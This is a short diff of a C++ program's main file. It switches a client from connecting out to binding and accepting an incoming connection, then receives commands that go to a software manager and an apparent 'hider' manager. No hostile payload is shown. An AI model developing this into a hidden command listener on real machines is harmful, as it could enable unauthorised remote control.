@@ -1,8 +1,8 @@
 #include <iostream>
 
+#include "SoftwareManeger.h"
 #include "Status.h"
 #include "client.h"
-#include "SoftwareManeger.h"
 #include "FunCodes.h"
 #include "HiderManeger.h"
 #include "HiderCodes.h"
@@ -15,7 +15,7 @@ int main() {
     Client client;
     client.createSocket();
     std::cout << "Created Socket\n";
-    client.connectServer();
+    client.bindSocket();
     std::cout << "Connected to server\n";
     SoftwareManeger swm = SoftwareManeger();
     HiderManeger hiderManager = HiderManeger();
@@ -24,7 +24,8 @@ int main() {
     while (cont)
     {
         loopIter(client, swm, hiderManager);
-        cont = false;
+        cont = false; // TODO remove this
+        std::cout << "compleated loop iter\n";
     }
 
     return EXIT_SUCCESS;
@@ -61,6 +62,9 @@ void loopIter(Client& client, SoftwareManeger& swm, HiderManeger hiderManeger)
     // receive command
     Message msg;
     Status res = SUCCSESS;
+    if (client.acceptConnection() != 0) {
+        return;
+    }
     std::cout << "Trying to receive command\n";
     client.recvCommand(msg);
     std::cout << "Command received\n";
